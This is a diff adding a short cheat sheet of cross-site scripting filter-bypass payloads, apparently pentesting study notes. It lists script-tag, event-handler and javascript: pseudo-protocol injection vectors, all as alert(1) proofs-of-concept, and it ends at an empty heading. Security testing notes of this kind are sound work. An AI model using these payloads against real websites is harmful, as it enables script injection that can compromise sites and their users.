@@ -1,0 +1,43 @@
+*Filter Bypass
+
+  *On error message:
+    - Determine what part of input is affecting the error, remove different parts to test
+    - find a way around specific issue
+     *Script tags:
+       <object data="data:text/html,<script>alert(1)</script>">
+       <object data="data:text/html;base64,CjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4=">
+       <a href="data:text/html;base64,CjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4=">Click Here</a>
+       
+     *Event Handlers:
+      <xml onreadystatechange=alert(1)>
+      <style onreadystatechange=alert(1)>
+      <iframe onreadystatechange=alert(1)>
+      <object onerror=alert(1)>
+      <object type=image src=valid.gif onreadystatechange=alert(1)></object>
+      <img type=image src=valid.gif onreadystatechange=alert(1)>
+      <input type=image src=valid.gif onreadystatechange=alert(1)>
+      <isindex type=image src=valid.gif onreadystatechange=alert(1)>
+      <script onreadystatechange=alert(1)>
+      <bgsound onpropertychange=alert(1)>
+      <body onbeforeactive=alert(1)>
+      <body onactivate=alert(1)>
+      <body onfocusin=alert(1)>
+      --html5--
+      <input autofocus onfocus=alert(1)>
+      <input onblur=alert(1) autofocus><input autofocus>
+      <body onscroll=alert(1)<br><br>...<br><input autofocus>
+      <video src=1 onerror=alert(1)>
+      <audio src=1 onerror=alert(1)>
+      --event handlers in closing tags---
+      </a on mouseover=alert(1)>
+      
+    *Script Pseudo-Protocols
+     <object data=javascript:alert(1)>
+     <iframe src=javascript:alert(1)>
+     <embed src=javascript:alert(1)>
+     ---HTML5---
+     <form id=test /><button form=test formaction=javascript:alert(1)>
+     <event-source src=javascript:alert(1)>
+     
+   *Dynamically evaluated styles
+    
